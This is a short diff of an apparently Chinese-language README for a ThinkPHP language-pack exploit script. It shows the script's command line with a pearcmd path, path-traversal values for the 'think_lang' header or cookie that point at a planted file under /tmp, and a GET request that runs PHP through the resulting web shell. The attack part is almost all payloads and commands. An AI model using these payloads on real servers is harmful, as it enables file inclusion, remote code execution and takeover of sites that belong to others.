@@ -24,14 +24,15 @@ python3 thinkphp_Lang_exp.py -u http://xxxx/index.php -m ../../pearcmd_path -p /
 ### 利用
 **GET连接shell**
 
-请求头
-Cookie: think_lang=../../../../../../../../../../../tmp/eeew
-
-或
-
-think_lang: ../../../../../../../../../../../tmp/eeew
-
 get: http://url/?1=phpinfo()
+
+设置请求头:
+```
+think_lang: ../../../../../../../../../../../tmp/eeew
+#or
+Cookie: think_lang=../../../../../../../../../../../tmp/eeew
+```
+
 
 **POST连接shell**
 参考exp
